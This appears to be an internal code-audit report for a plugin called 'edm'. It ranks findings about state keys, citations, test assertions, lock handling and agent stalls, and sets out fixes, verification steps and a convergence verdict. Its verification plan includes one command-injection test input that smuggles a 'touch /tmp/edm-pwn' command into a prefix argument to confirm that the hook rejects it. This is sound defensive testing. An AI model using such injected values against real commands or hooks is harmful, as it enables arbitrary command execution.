**Problem.** `jira_synced_at` and `jira_project_key` are `SETTABLE_KEYS` members (`bin/edm-state:1804`) whose provenance comment (`:1795-1796`) claims "both directions". The producer half is real (`skills/push-jira/SKILL.md:165-166`, Step 8); the consumer half does not exist -- no `jq` read in `bin/edm-state`, no HANDOFF row, no `metrics-report` row, no `validate` anomaly, neither key in `cmd_init`'s payload, and no skill or agent reads either back from state. Worse, the userConfig twin shadows the state twin: Step 1 (`SKILL.md:28`) resolves the project key from `${user_config.jira_project_key}`, never from state, so the value Step 8 persisted is discarded on the next push -- the identical shape to `qc_shard_threshold`. Three aggravators put this above that key's P2: it is a **confirmed recurrence** of the class round 6's G29/CA-356 closed, so the round-6 remediation is defective rather than merely incomplete; the remediation artifact itself (the durability comment) states the falsehood; and `SKILL.md:224` makes the user-facing promise "tracks `jira_synced_at` and `jira_project_key` so future runs know what's already been pushed" that no code keeps -- real idempotency comes from the JQL label search at `SKILL.md:55`, which needs neither key.

**Fix.** Reader route: change `SKILL.md:28`'s resolution order to argument -> `edm-state get <PREFIX> | jq -r '.jira_project_key'` -> `${user_config.jira_project_key}`, and have Step 1 print the prior `jira_synced_at` so the operator sees when the last push happened (this makes `:224` true). Delete route: drop both from `SETTABLE_KEYS:1804`, delete the two `set` calls at `:165-166`, and rewrite `:224` to name the JQL label search as the actual idempotency mechanism -- mirroring the `last_cmd` (CA-246) and `qc_shard_threshold` (CA-356) precedents. Either way replace "both directions" at `:1795-1796` with the **named producer and the named consumer**, per the rule at `:1771-1773`. Land with G44/CA-422, which is what would have caught this.

**Verification.** `grep -rn 'jira_project_key' plugins/edm/` shows either a real read site in `bin/edm-state`/`skills/` or no occurrence outside history; the new `wave7-smoke.sh` consumer-side case (G44) passes for every `SETTABLE_KEYS` member; `push-jira` re-run on an initiative with a stale userConfig value resolves the state value.

**Files affected.** `plugins/edm/bin/edm-state`, `plugins/edm/skills/push-jira/SKILL.md`, `plugins/edm/CLAUDE.md` (state-field reference), `plugins/edm/bin/tests/wave7-smoke.sh`.

---

### G7 (P1, lens L9): `architecture.md:609` cites a line range that does not exist and calls a changed surface "Unchanged" -- CA-385

**Problem.** The concurrency-control row of the enforcement-surface table states that concurrent `edm-state` writers are guarded by `with_state_lock` (`:359-396`) with "flock with 10s timeout, or the mkdir spin-lock fallback with 50 tries. **Unchanged**". Two defects: (a) `with_state_lock()` is defined at `plugins/edm/bin/edm-state:1119` and `write_atomic()` at `:637` -- nothing lives at `:359-396`; (b) "Unchanged" is false, because round 6's commit `4022300` is titled "close eight `with_state_lock`/`write_atomic` concurrency gaps (Wave 4a)". This is a direct recurrence of the initiative's documented 4+-round root cause ("a code remediation lands and the AC/SRD text naming the old code shape never gets swept in the same commit") **inside round 6 itself** -- the round whose stated purpose included fixing four citation defects and adding the "verbatim shipped case labels, never a paraphrase" convention to `tickets/README.md`. That convention cannot reach `architecture.md`, so it structurally could not have caught this.

**Fix.** In one commit: replace the `:359-396` anchor with a by-name anchor (`with_state_lock()` / `write_atomic()` in `plugins/edm/bin/edm-state`) -- the remediation the four `bin/` precedents received, per L6's exemplars -- and replace "Unchanged" with a pointer to the Wave 4a remediation and the eight closed gaps. Then extend the round-6 citation convention to cover `architecture.md` and `srd.md` line anchors, not just ticket ACs, and pair it with G38/CA-416's same-commit-sweep field.

**Verification.** `grep -n ':359-396' SRD/edm/EDMV3__prompt-streamline/architecture.md` returns nothing; `grep -n 'Unchanged' architecture.md` shows no occurrence on the concurrency row; the citation-durability scan (G28's extension) covers `SRD/**/*.md` anchors; `plugins/edm/bin/edm-lint-artifacts EDMV3` clean.

**Files affected.** `SRD/edm/EDMV3__prompt-streamline/architecture.md`, `SRD/edm/EDMV3__prompt-streamline/tickets/README.md` (convention scope), `plugins/edm/bin/tests/wave7-smoke.sh`.

---

### G8 (P1, lens L4): an assertion that cannot fail by construction -- CA-386

**Problem.** `wave7-smoke.sh:1004-1005` checks the needle `'*.awk|*.txt) continue ;;'` against a haystack of `cat` of `wave7-smoke.sh` **itself**, and the needle literal is on line 1005 inside the assertion. The T61 AC10 twin loop could delete its exclusion entirely and this stays green -- it proves only that the assertion exists. The immediately preceding assertion (`:1000-1003`, an exact `-eq 2` count against `.gitlab-ci.yml`) is correct; only the self-referential half is broken.

**Fix.** Scope the haystack to the twin's actual `case` block -- `awk '/T61 AC10/,/^done/'` over the loop region -- and exclude the assertion line, or (better) move the shared exclusion into one named variable `T61_EXCLUDE_GLOBS` that both the CI job and the loop read and assert on the variable. `_harness.sh:207-208` already solved exactly this self-match problem via `grep -vF` of the assertion's own file; the pattern exists in-tree and was not applied here.

**Verification.** Temporarily delete the exclusion from the twin loop and confirm the assertion now FAILS (positive control), then restore. Re-run `wave7-smoke.sh`.

**Files affected.** `plugins/edm/bin/tests/wave7-smoke.sh` (and `.gitlab-ci.yml` if the shared-variable route is taken).

---

### G9 (P1, lens L4): "the bin/ table names all four subcommands" passes on unrelated prose -- CA-387

**Problem.** `wave7-smoke.sh:1190-1196` loops `grep -q -- "$t66_c"` for `audit-converged`, `render-ledger`, `audit-round-complete` and `migrate-schema` over the whole 700-line `plugins/edm/CLAUDE.md`, then passes "T66 AC3 -- CLAUDE.md's `bin/` table names all four wave-B/C subcommands". All four demonstrably occur **outside** the `## bin/ helper scripts` table today (`migrate-schema` in the `schema_version` contract prose, `audit-round-complete` in Cost tracking and the state-field table, `render-ledger` in the `decisions.md`-vs-`findings-ledger.md` note, `audit-converged` in the `audit_rounds` row). Delete all four rows from the table and the test stays green. Not a design choice: the very next block at `:1215` scopes correctly with `awk '/^## \`bin\// {f=1} f && /^##/{exit} ...'` -- round 6 added the scoped version beside the unscoped one and left both.

**Fix.** Reuse the `:1215` awk range extraction as the haystack for the membership loop.

**Verification.** Delete one of the four rows from `CLAUDE.md`'s `bin/` table in a scratch copy and confirm the assertion FAILS; restore; re-run `wave7-smoke.sh`.

**Files affected.** `plugins/edm/bin/tests/wave7-smoke.sh`.

---

### G10 (P1, synthesizer): the audit infrastructure regressed measurably this round -- CA-388

**Problem.** Filed **separately from the standing CA-130** (which records that lens agents are delivered without their granted `Write`/`Edit`/`Bash`), because this is a distinct, measurable regression on top of it rather than another recurrence. Round-7 data: **all eleven lenses stalled at least once** before producing usable output, several two or three times (L5 and L7 each record two prior stalled attempts; L1, L2, L3, L4, L6, L8, L9, L10, L11 each record at least one), against round 6 where most lenses produced output on the first attempt. Consequences visible in this round's own artifacts: every one of the 11 reports had to be transcribed by the orchestrator from the agent's final message; L11 records that the pass directory held **zero `.jsonl` files**, so the JSONL half of the lens output contract was elided for the entire round; and four lenses shipped explicit truncation caveats (L3 ~30% of the concurrency surface, L4 no `wave6-smoke.sh`, L6 no `agents/`/`README.md`/`CHANGELOG.md`, L9 no `srd.md` requirement sweep and no AC-by-AC epic sweep). The convergence gate therefore rests on a demonstrably partial "full" round.

**Fix.** Owned outside the repository, but the repository can make it measurable and can stop laundering it: (1) stabilise lens-agent delivery -- retry-with-backoff plus a stall detector in `skills/code-audit/SKILL.md`'s launch step; (2) restore `Write` so each lens persists its own `lens-L{N}.md` **and** `lens-L{N}.jsonl` rather than relying on transcription; (3) satisfy CA-331 -- one Bash-capable pass runs `plugins/edm/bin/tests/run-all.sh` -- before any round may claim convergence; (4) have the code-audit skill record per-lens stall counts and truncation caveats into the pass directory (a `lens-delivery.md` or a field per lens in `lenses-run.txt`) so the degradation is tracked round over round instead of anecdotally; (5) have `cmd_audit_round_complete` refuse to record a round as `full` when any lens's report declares its own scope truncated.

**Verification.** Next round's pass directory contains 11 `.md` **and** 11 `.jsonl` files written by the lenses themselves; `lenses-run.txt` (or its successor) records zero stalls; `run-all.sh` output is attached to the pass directory.

**Files affected.** `plugins/edm/skills/code-audit/SKILL.md`, `plugins/edm/bin/edm-state` (`cmd_audit_round_complete`), `plugins/edm/CLAUDE.md` (code-audit section). Host-side agent delivery is out of repository scope.

---

### P2 findings G11-G44

Each carries its full problem statement, fix and durability half in the ledger entry named beside it -- `SRD/edm/EDMV3__prompt-streamline/code-audit/findings-ledger.jsonl`, IDs `CA-389` through `CA-422`. Grouped here by the commit they should land in:

- **HANDOFF/gate correctness (`bin/edm-state`, one commit)** -- G11/CA-389 (denominator `0` vs `3` for `fast-track`/`fix-pack`; test the *function's* status, not the pipeline's, and add the three `wave6-smoke.sh` assertions round 6 recommended), G12/CA-390 (dedupe or self-explain the gate list; rename the heading to `## Gates (approval history)`), G13/CA-391 (`^[123]$` on `approve-gate`, plus two `check_refuses_and_leaves_state` cases).
- **Lock machinery (`bin/edm-state`, one commit)** -- G18/CA-396 (`_lock_timeout_marker="${lockbase}.lock.timeout.${BASHPID:-$$}"` makes both dead sweeps live and fixes the PID-collision diagnostic; correct the `:2933` comment), G19/CA-397 (one `EDM_STATE_LOCK_WAIT_S=10` constant driving both branches), G20/CA-398 (pass `tries` as a parameter), G37/CA-415 (restate the fd-200 rationale to name fd 9 and the 10+ band), G21/CA-399 (trap the `audit-converged` errfile via the existing `_save_traps`/`_restore_traps` pair).
- **Hook layer (`hooks/hooks.json`, land with G1/G2/G4)** -- G31/CA-409 (one predicate for "legitimate first invocation"), G32/CA-410 (settle the prefix character class across all ten sites; confirm `bin/edm-validate-prefix` first), G33/CA-411 (reference the shard rule or document the auto-spawn path as deliberately unsharded), G34/CA-412 (add the `<PREFIX>` derivation step to the `SubagentStop` prompt; confirm the `record-partial-verdict` open-vs-close forms), G35/CA-413 (`pwd -P` both sides before relativizing; smoke case over a symlinked scratch repo), G36/CA-414 (`core.quotePath=false` plus `printf '%s\n'`).
- **DRY residuals (`bin/edm-state`, one commit)** -- G39/CA-417 (convert `:2227` and `:5048` to `skipped_phases_str`, correct the docstring count to four, add the `count_matches_strict` single-definition pin), G40/CA-418 (shared header/underline defs from the same padding constants; extend `wave5-smoke.sh:112`), G41/CA-419 (`_cmd_set_provenance_link` plus the missing `write_handoff_internal` calls -- now actionable because CA-357 resolved by documenting rather than deleting), G42/CA-420 (`archived_state_file_for <prefix>` next to `state_file_for`, or narrow the overclaiming comment).
- **Test-quality batch (`bin/tests/`, one commit)** -- G14/CA-392, G16/CA-394, G17/CA-395, G23/CA-401, G24/CA-402, G25/CA-403, G26/CA-404, G27/CA-405, G30/CA-408. Land G16/CA-394 first: it is the only one that can silently green-light 49 refuse-and-leave-state proofs.
- **Docs and durability rules** -- G28/CA-406 (by-name anchors for the three `bin/` citations, or assert them), G29/CA-407 (extend the `schema_at_least` assertion to the 4/2 comment split, or narrow the prose), G38/CA-416 ("spec/AC text swept in same commit" field on every ledger entry), G43/CA-421 and G44/CA-422 (consumer-side enforcement for `SETTABLE_KEYS`, which is what would have caught G6/CA-384).
- **Eval scorer** -- G15/CA-393 (delete the unreachable dim-4 skip branch; the deliberate hard-zero intent becomes legible).

## Decisions / Non-Findings

Flagged this round and determined **Not Actionable**. Future audits should NOT re-investigate these.

1. **L3 flagged `edm-sync-canonical-sections:81`'s temp file as needing a `.gitignore` entry** -- L5 verified root `.gitignore:34` already covers it (CA-150); trap is EXIT INT TERM HUP.
2. **L2 flagged `score-artifacts.sh:663-708` (`--compare`) as dead code** -- documented as intentional for AC4 testability; the real issue is drift, filed as G3/CA-383.
3. **L1 swept the full tree for incompleteness markers and found zero in production code** -- every `TODO`/`stub`/`placeholder` hit is a fixture under test, a specified stub schema, or rule text.
4. **L4 flagged `|| true` on ~60 `grep -c` sites** -- documented as deliberate at `wave7-smoke.sh:1236-1238`; G23 concerns the sites that *omit* it.
5. **L4 flagged the suite asserting on prose rather than runtime behavior** -- inherent to a prompt-streamlining initiative whose deliverable is prose.
6. **L7 flagged two "skip if binary absent" idioms (`|| true` vs `command -v ... || exit 0`)** -- justified: fire-and-forget checkpointing must never block a session; the guard form is required where a later exit code is load-bearing.
7. **L7 flagged `PreToolUse` exit 1 (non-blocking) vs `UserPromptExpansion` exit 2 (blocking) for user error** -- both contracts spelled out in `CLAUDE.md`; blocking a human's commit over plugin misconfiguration is hostile.
8. **L10 flagged five byte-identical command hooks and five duplicated prompt procedures** -- JSON has no include mechanism; the advisory second layer is deliberate and self-documented.
9. **L10 flagged `check_refuses_and_leaves_state` duplicating `check_fails` + `check_state_unchanged`** -- argued at `_harness.sh:312-319` (CA-042): composing them needs two executions, "neither of which alone proves the other".
10. **L10 flagged per-script `die()` in nine `bin/` helpers and three `evals/` drivers** -- each owns its exit-code family, pinned deliberately as a matrix at `wave7-smoke.sh:7742`.
11. **L10 flagged test-side `date -u` and `_harness_hash_file` against their `edm-state` twins** -- the harness must not depend on the binary under test.
12. **L8 flagged hardcoded `/Users/darryl.porter/projects/...` paths in `CLAUDE.md:366,374`** -- prose in a licence-provenance record that states it is recording a local inspection; naming the machine is the point.
13. **L8 flagged `.edm-state.json` written at ambient umask with no `chmod`** -- Architectural rule 3 makes it a deliberately git-committed deliverable; 644 is correct.
14. **L8 flagged `for p in $prefixes` unquoted word-split** -- clamped upstream by `grep -E '^[A-Z][A-Z0-9_-]*$'`; the split is the intent.
15. **L8 flagged `root=... awk 'ENVIRON["root"]'` instead of `awk -v`** -- deliberate hardening (`-v` reprocesses backslash escapes); preserve against a future "simplify" cleanup.
16. **L8 flagged the hook refusing an absolute `EDM_SRD_ROOT` while handing an absolute `$check_dir` to children** -- correct asymmetry (string-matching staged paths vs resolving directories); worth one inline comment, not a fix.
17. **L9 flagged Wave 3 / Wave 4a as absent from the ticket pack (scope creep)** -- `findings-ledger.md` is the documented work-item source for audit remediation; the structural residue is filed as G38/CA-416.
18. **L11 flagged `git-lock-check`, `set-parent`, `add-related`, `migrate-schema`, `migrate-path`, `validate`, `render-ledger` as having no automated caller** -- all documented operator commands (filter 1).
19. **L11 flagged `KillShell`/`BashOutput` granted with no `Bash` grant on every lens agent** -- CA-179's accepted dead-grant surface.
20. **L11 flagged the five prompt hooks as outside `edm-check-grants`' reach** -- correct by design; the executor is the session, not a spawned agent.
21. **L6 flagged `~line 231`/"1000+ lines later" approximations, `agents/x.md:12` example output, and ~20 `| ID | File:Line |` table headers** -- approximations and column labels, not citations; recorded so a future strict `path:NNN` guard does not false-positive.
22. **L6 flagged the unfilled `<date>` in "Derived from tiering matrix `<date>`" and the Opus-4.8-era pricing tables** -- both immediately followed by explicit "NOT yet matrix-derived" / cross-check instructions (D23/D28).
23. **L1 re-verified and left NOTED from rounds 5-6**: `--calibrate` upper median, `edm-validate-prefix:80` doubled slash, `edm-lint-artifacts:365-402` redundant guard, `edm-state:485-494` `unknown` arm (D32), `pattern_target_heading_for` (CA-114), `edm-compare-eval:47-50` (CA-289), `edm-check-grants:437-443` unused `ln`, `audit-converged`'s `deferred` acceptance (EDMV3-T25 AC4), `_rmw_state_body:718`'s `&&` idiom, `with_state_lock`'s negative-age refusal, `cmd_git_lock_check:3832`'s `$$`/`$PPID` in a subshell, `jq -r 'FILTER' -s FILE` option order, doubled `initiative_dir_for`, `_harness.sh:113`'s trap-on-local. **Do not re-file.**

### Notes on evidence that stops short of a status change

Recorded so the next round does not have to re-derive them, and so nobody reads them as closures:

- **CA-233** -- L4-01's neighbouring assertion (`wave7-smoke.sh:1000-1003`, an exact `-eq 2` count of the `*.awk`/`*.txt` exclusion against `.gitlab-ci.yml`) implies the CI half landed, but no lens read `.gitlab-ci.yml:105-107` directly this round. Left **open**; confirm in a Bash-capable pass.
- **CA-350** -- L4 swept `wave7-smoke.sh` for case-sensitivity mismatches and found only `:2098`, which suggests the `:4206` tripwires were remediated. Not named as fixed by any lens; left **open** and folded the `:2098` residue into G24/CA-402.
- **CA-352** -- L3 refers to "round 6's duplicate-match refusal", implying a refusal landed, then states it "was not re-verified this round". Left **open**.
- **CA-353** -- L5's P2-1 shows `audit-converged` stderr now captured to `_of_errfile` rather than rendered inline, which suggests the fix landed; no lens named CA-353. Left **open**.
- **CA-037** (P1, not in the open set) -- L10 records it **NOT re-verified for a second consecutive round**; the ten hand-rolled copies across wave6/wave7 again exceeded budget without Bash. If its ledger status is `fixed`, that status is unconfirmed.
- **Suite greenness is not confirmed for any finding in this plan.** No lens had `Bash`.

## Rollout Order

1. **P0**: none. No finding in this round will cause production failure or a security gap that is confirmed-reachable; G4/CA-381 is the closest and is held at P1 only because the host's `$ARGUMENTS` semantics are undetermined. **Resolve G4's open question first** -- if the host substitutes textually, re-rank it P0 and ship it alone.
2. **P1 wave, parallelisable by file** (10 findings, 4 independent file groups):
   - **Group A -- `hooks/hooks.json` (serialise internally, one file)**: G4/CA-381, then G1/CA-379, then G2/CA-380's extraction. Fold in the P2 hook items (G31, G32, G33, G34, G35, G36) while the file is open -- rewriting the same five prompt bodies twice is how CA-345 regressed.
   - **Group B -- test suites**: G8/CA-386, G9/CA-387 (independent of A; both are `wave7-smoke.sh`, so land them together with the P2 test-quality batch).
   - **Group C -- `bin/edm-state` + `bin/edm-init` + `.gitignore` + `README.md`**: G5/CA-382, G6/CA-384 (with G44/CA-422's check).
   - **Group D -- docs/spec and evals**: G7/CA-385 (`architecture.md`), G3/CA-383 (`edm-compare-eval` + `score-artifacts.sh` + two docs).
   - **G10/CA-388** is infrastructure: items (1)-(2) are host-side and land outside this repo; items (3)-(5) are `skills/code-audit/SKILL.md` + `cmd_audit_round_complete` and can go in any wave.
3. **P2 wave**, batched by the six commit groups listed under "P2 findings G11-G44". Order within the wave: test-quality batch first (G16/CA-394 leads -- it is the only P2 that can silently green-light 49 proofs), then lock machinery, then HANDOFF/gate correctness, then DRY residuals, then docs/durability, then the eval scorer.
4. **Explicitly deferred**: none this round. CA-344 remains `open` with round 6's deferral rationale re-verified intact (L10-105) -- sequence it behind G3 and G39 as L10 recommends.
5. **Do not batch a doc sweep separately from its code change.** Five rounds of recurrence (CA-385 is the newest instance, authored inside round 6) say the AC/spec edit must land in the *same commit* as the code edit. G38/CA-416 exists to make that obligation mechanical.

## Verification Plan

Run from the repository root. Per this repo's convention, invoke the plugin binaries by explicit path -- bare `edm-*` resolves to a stale plugin cache.

```sh
# 1. Syntax (all shipped shell, plus the hook strings once G2 lands)
for f in plugins/edm/bin/* plugins/edm/bin/tests/*.sh plugins/edm/evals/*.sh; do bash -n "$f" || echo "SYNTAX: $f"; done
jq -r '.hooks | to_entries[] | .value[] | .hooks[] | select(.type=="command") | .command' \
  plugins/edm/hooks/hooks.json | while IFS= read -r c; do printf '%s\n' "$c" | bash -n /dev/stdin || echo "HOOK SYNTAX"; done
jq empty plugins/edm/hooks/hooks.json && jq empty .claude-plugin/marketplace.json

# 2. Lint (the four blocking classes)
shellcheck -i SC2086,SC2046,SC2048,SC2068 plugins/edm/bin/* plugins/edm/bin/tests/*.sh plugins/edm/evals/*.sh
plugins/edm/bin/edm-check-vocabulary
plugins/edm/bin/edm-lint-artifacts EDMV3
plugins/edm/bin/edm-check-grants
plugins/edm/bin/edm-check-skill-sync

# 3. Full suite -- REQUIRED this round: bin/ code changed (CA-331 precondition)
plugins/edm/bin/tests/run-all.sh

# 4. State + ledger integrity
plugins/edm/bin/edm-state validate EDMV3
plugins/edm/bin/edm-state render-ledger EDMV3   # re-render; see caveat below
plugins/edm/bin/edm-state audit-converged EDMV3 # expect a refusal while P1s are open

# 5. Targeted manual smoke tests
#  a. G1: rename jq off PATH, run /edm:srd <PREFIX> -- expansion ALLOWED, diagnostic reported
#  b. G1: with gate unapproved and jq present -- expansion BLOCKED, stderr names the gate
#  c. G4: /edm:srd 'A"; touch /tmp/edm-pwn; "' -- exit 2, invalid-prefix diagnostic, no /tmp/edm-pwn
#  d. G5: on Linux (or with a flock shim) run render-ledger, then git status --porcelain -- clean
#  e. G35: clone into a symlinked path (macOS /tmp), set EDM_SRD_ROOT under it, commit -- lint RUNS
#  f. G3: edm-compare-eval on two scores.json files differing in scorer_version -- exit 2
#  g. G8/G9: break the guarded thing in a scratch copy, confirm the assertion FAILS, restore
```

**Ledger render caveat.** `findings-ledger.md` was patched by hand this round because the synthesizer had no `Bash` and could not run `edm-state render-ledger`. The next Bash-capable pass must re-run `plugins/edm/bin/edm-state render-ledger EDMV3` and commit the normalised output. All 44 new titles were written free of `|` characters so the CA-378 pipe-escaping defect cannot corrupt the table in the interim.

**Re-audit (targeted).** Re-run the lenses whose findings this round's fixes touch: **L1, L4, L5, L7, L8, L10, L11** for the P1 wave; add **L2, L3, L6** for the P2 wave; add **L9** unconditionally, since its round-7 pass was truncated before any `srd.md` or AC-by-AC sweep ran. Because four lenses shipped truncation caveats, the next round cannot be treated as a re-verification of round 7 alone -- L4 must cover `wave6-smoke.sh`, L3 must cover `write_atomic`'s body and `state_file_for`, L6 must cover `agents/`, `README.md` and `CHANGELOG.md`, and L2 must cover `run-eval.sh`, `tiering-matrix.sh` and `edm-compare-eval`.

## Convergence Read

**Not converged. The gate must refuse.**

- **P0 open: 0**
- **P1 open: 15** (10 new: CA-379, CA-380, CA-381, CA-382, CA-383, CA-384, CA-385, CA-386, CA-387, CA-388; 5 carried: CA-333, CA-334, CA-336, CA-337, CA-338)
- **P2 open: 60** (34 new: CA-389 - CA-422; 26 carried)
- **Total open: 75.** Fixed this round: 17. Deferred: 0. NOTED / not-actionable filtered this round: 23 grouped decisions (dozens of individual lens items).
- **Round type: full** (11/11 lenses), so this round is *eligible* to satisfy the convergence gate on lens coverage grounds and **fails it on findings**: the gate requires zero open P0 and zero open P1.

Three structural reads the parent should weigh before scheduling round 8:

1. **Round 6's remediation was real but leaky.** 17 of 48 prior findings verified fixed against the tree by the lens that raised them -- the first round in this initiative to produce confirmed closures at scale. But **six of this round's 44 new findings are residuals of round-6 fixes** (CA-389, CA-390 from CA-335; CA-407 from CA-342; CA-413 from CA-320; CA-417, CA-420 from CA-343; CA-397 from CA-364), **one is a regression introduced by a round-6 fix** (CA-379, from CA-345), and **two are confirmed recurrences of a class round 6 closed** (CA-384, CA-421, against CA-356). L10 names this explicitly: CA-417 is the third instance in two rounds of two same-round fixes invalidating each other. Convergence will keep receding until remediation waves are re-grepped against each other before the round closes.
2. **The count is a floor, not a total.** Four lenses truncated, no lens could run the suite, and every lens stalled at least once (G10/CA-388). Nine of the 31 carried-open findings are carried purely because no lens reached them, not because they were checked and found live. A round that cannot re-verify its own prior findings cannot certify convergence, whatever the count says.
3. **The highest-leverage fixes are not the highest-severity ones.** G2/CA-380 (bring `hooks/hooks.json` under the linters) would have caught three of this round's four hook findings. G44/CA-422 (consumer-side check for `SETTABLE_KEYS`) would have caught G6/CA-384 and G43/CA-421. G38/CA-416 (same-commit doc-sweep field) addresses the five-round recurrence that produced G7/CA-385. Landing those three durability items early converts several classes from "found again next round" to "cannot recur".
